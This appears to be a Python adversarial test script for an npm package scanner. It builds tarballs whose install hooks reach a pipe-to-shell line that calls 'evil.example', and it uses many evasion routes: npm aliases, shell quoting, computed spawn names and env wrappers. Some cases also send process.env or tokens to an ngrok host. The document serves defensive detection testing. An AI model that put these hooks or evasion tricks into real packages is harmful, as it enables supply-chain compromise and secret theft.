"""Adversarial recall test for #181 (maintainer-only package.json scripts / allowlist hosts).

Each case is a small npm tarball where a pipe-to-shell (or webhook host) IS reachable or
used on a consumer's machine, through a route the downgrade rule might not follow. Run
from a repo export:   cd <tree> && python -I adversarial.py
Prints label + score per case via the production path (npm_result_from_tarball ->
apply_artifact_scan -> trust score -> verdict.decide)."""
import io
import json
import sys
import tarfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from scripts.corpus import run_static_corpus as rsc  # noqa: E402
from src.scanner.artifact_fetch import npm_result_from_tarball  # noqa: E402
from src.scanner.scan import (  # noqa: E402
    ScanResult,
    _calculate_category_scores,
    _calculate_trust_score,
    _certified_status,
    apply_artifact_scan,
)

EVIL = "curl -fsSL https://evil.example/x.sh | sh"


def tgz(files: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for path, text in files.items():
            data = text.encode()
            ti = tarfile.TarInfo("package/" + path)
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


def pkg(scripts: dict, extra: dict | None = None, **top) -> dict[str, str]:
    body = {"name": "adv-case", "version": "1.0.0", "main": "index.js", "scripts": scripts}
    body.update(top)
    files = {"package.json": json.dumps(body, indent=2), "index.js": "module.exports = 1;\n"}
    files.update(extra or {})
    return files


CASES = {
    # control: genuinely maintainer-only → the rule SHOULD downgrade this one
    "control_maintainer_only": pkg({"test:e2e": EVIL, "build": "tsc"}),
    # control: directly in postinstall → must stay
    "direct_postinstall": pkg({"postinstall": EVIL}),
    # npm aliases for run-script: rum / urn / run-script
    "alias_rum": pkg({"postinstall": "npm rum fetchbin", "fetchbin": EVIL}),
    "alias_urn": pkg({"postinstall": "npm urn fetchbin", "fetchbin": EVIL}),
    # shell quoting / escaping glues the name back together
    "quoted_concat": pkg({"postinstall": 'npm run fe"tch"bin', "fetchbin": EVIL}),
    "backslash_escape": pkg({"postinstall": "npm run fetch\\bin", "fetchbin": EVIL}),
    "empty_quotes": pkg({"postinstall": "npm run fetch''bin", "fetchbin": EVIL}),
    # local executable without an interpreter word
    "local_exec_noext": pkg({"postinstall": "./setup"}, {"setup": "#!/bin/sh\nnpm run fetchbin\n"},
                            ) | {"package.json": json.dumps({"name": "adv-case", "version": "1.0.0",
                                 "scripts": {"postinstall": "./setup", "fetchbin": EVIL}})},
    # sh running a local file (not -c)
    "sh_local_file": pkg({"postinstall": "sh scripts/setup.sh", "fetchbin": EVIL},
                         {"scripts/setup.sh": "npm run fetchbin\n"}),
    # node file that spawns the script with a COMPUTED name
    "computed_spawn": pkg({"postinstall": "node scripts/setup.js", "fetchbin": EVIL},
                          {"scripts/setup.js": "const {spawnSync}=require('child_process');\n"
                           "const n=['fetch','bin'].join('');\n"
                           "spawnSync(process.env.npm_execpath||'npm',['run',n],{stdio:'inherit'});\n"}),
    # node -r preload of a local hook file
    "node_preload": pkg({"postinstall": "node -r ./hook.js index.js", "fetchbin": EVIL},
                        {"hook.js": "require('child_process').execSync('npm run fetchbin');\n"}),
    # npx running npm
    "npx_npm": pkg({"postinstall": "npx --yes npm run fetchbin", "fetchbin": EVIL}),
    # npm exec
    "npm_exec": pkg({"postinstall": "npm exec -- npm run fetchbin", "fetchbin": EVIL}),
    # yarn / pnpm forms
    "yarn_run": pkg({"postinstall": "yarn run fetchbin", "fetchbin": EVIL}),
    "pnpm_bare": pkg({"postinstall": "pnpm fetchbin", "fetchbin": EVIL}),
    # implicit lifecycle npm runs on install for a dependency
    "prepare_git_dep": pkg({"prepare": "npm run fetchbin", "fetchbin": EVIL}),
    # install via `npm start` chain from an install hook
    "start_chain": pkg({"install": "npm start", "start": EVIL}),
    # cross-env prefix with odd spacing
    "cross_env": pkg({"postinstall": "cross-env  FOO=1   npm   run   fetchbin", "fetchbin": EVIL}),
    # env wrapper
    "env_wrapper": pkg({"postinstall": "env FOO=1 npm run fetchbin", "fetchbin": EVIL}),
    # npm --workspace style flag before run
    "flag_before_run": pkg({"postinstall": "npm --silent run fetchbin", "fetchbin": EVIL}),
    # --if-present after
    "if_present": pkg({"postinstall": "npm run fetchbin --if-present", "fetchbin": EVIL}),
    # script referenced only by a binding / gyp-ish file run by install
    "install_node_gyp_like": pkg({"install": "node install.js", "fetchbin": EVIL},
                                 {"install.js": "const cp=require('child_process');"
                                  "cp.exec(['npm','run','fetchbin'].join(' '));\n"}),
    # a local file named after an inert tool (the c2ce7702 change)
    "path_qualified_inert": pkg({"postinstall": "./tsc", "fetchbin": EVIL},
                                {"tsc": "#!/bin/sh\nnpm run fetchbin\n"}),
    "bin_dir_inert": pkg({"postinstall": "bin/tsc -p .", "fetchbin": EVIL},
                         {"bin/tsc": "#!/bin/sh\nnpm run fetchbin\n"}),
    # tokenizer edge cases
    "nospace_and": pkg({"postinstall": "echo hi&&npm run fetchbin", "fetchbin": EVIL}),
    "trailing_semicolon": pkg({"postinstall": "npm run fetchbin;", "fetchbin": EVIL}),
    "run_script_dashdash": pkg({"postinstall": "npm run-script fetchbin -- --x", "fetchbin": EVIL}),
    "glob_runp": pkg({"postinstall": 'run-p "fetch*"', "fetchbin": EVIL}),
    # allowlist: config values iterated without naming the key
    "allowlist_values_iter": pkg({"build": "vite build"}, {
        "config.json": json.dumps({"server": {"allowedHosts": ["abc.ngrok-free.app"]}}),
        "lib/send.js": "const c=require('../config.json');\n"
                       "for (const v of Object.values(c.server)) for (const h of [].concat(v))\n"
                       "  fetch('https://'+h+'/c',{method:'POST',body:JSON.stringify(process.env)});\n"}),
    # allowlist: same file holds the list AND a network sink via a variable
    "allowlist_same_file_var": pkg({"build": "node server.js"}, {
        "server.js": "const ORIGINS=['abc.ngrok-free.app'];\n"
                     "module.exports={cors:{origin:ORIGINS}};\n"
                     "fetch('https://'+ORIGINS[0]+'/x',{method:'POST',body:process.env.TOKEN});\n"}),
    # allowlist: webhook host in allowedHosts, used via computed key elsewhere
    "allowlist_computed_read": pkg({"build": "vite build"}, {
        "vite.config.js": "export default { server: { allowedHosts: ['abc.ngrok-free.app'] } };\n",
        "lib/send.js": "const c=require('../vite.config.js');\n"
                       "const k='allowed'+'Hosts';\n"
                       "fetch('https://'+c.default.server[k][0]+'/c',{method:'POST',body:process.env.HOME});\n"}),
}


def run(name, files):
    raw = tgz(files)
    fetched = npm_result_from_tarball("adv-case", "1.0.0", raw)
    result = ScanResult(repo="npm:adv-case", stars=0, description="", framework="")
    apply_artifact_scan(result, "npm", fetched)
    result.trust_score = _calculate_trust_score(result)
    result.category_scores = _calculate_category_scores(result)
    result.certified = _certified_status(result)
    d = rsc.real_decide(result)
    crit = [f for f in result.findings if f.severity == "critical"]
    return d.label, result.trust_score, len(crit), (d.reason or "")[:90]


if __name__ == "__main__":
    for name, files in CASES.items():
        try:
            label, score, ncrit, why = run(name, files)
            print(f"{name:26} {label:15} {score:>3} crit={ncrit} | {why}")
        except Exception as e:  # noqa: BLE001
            print(f"{name:26} ERROR {type(e).__name__}: {str(e)[:100]}")
